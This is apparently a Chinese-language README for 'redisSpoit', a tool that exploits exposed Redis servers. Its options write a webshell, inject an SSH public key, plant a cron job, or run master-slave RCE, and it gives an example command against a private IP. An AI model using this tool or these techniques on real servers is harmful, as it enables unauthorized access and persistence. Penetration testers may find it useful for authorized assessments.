# redisSpoit

> 集成了redis常用的漏洞，可一键写入shell，ssh，cron等

# 0x01 使用方法

```
Options:
  -h, --help            show this help message and exit
  -u URL, --url=URL     目标ip
  -p PORT, --port=PORT  目标端口
  -a AUTH, --auth=AUTH  密码认证
  -d, --disflush        不适用 ‘flushall’ 命令
  --rsa                 公钥注入
  --shell               webshell 写入
  --cron                计划任务写入[不适用ubuntu]
  --slave               主从RCE[redis4.x-5.x]
```

**示例：**

```
python .\redisSpoit.py -u 192.168.1.96 -p 6379 --rsa
```

![image-20210810154419822](C:/Users/LOSEYOURSELF/AppData/Roaming/Typora/typora-user-images/image-20210810154419822.png)

# 0x02 注意事项

​	1. 公钥,exp.so请放在db文件夹下

 2. 主从rce暂未测试完毕，我的高版本redis出了点问题，低版本`2.8.17`测试时可以正常连接，只是因版本问题无法执行命令。后续会测试

    ![image-20210810154953191](C:/Users/LOSEYOURSELF/AppData/Roaming/Typora/typora-user-images/image-20210810154953191.png)

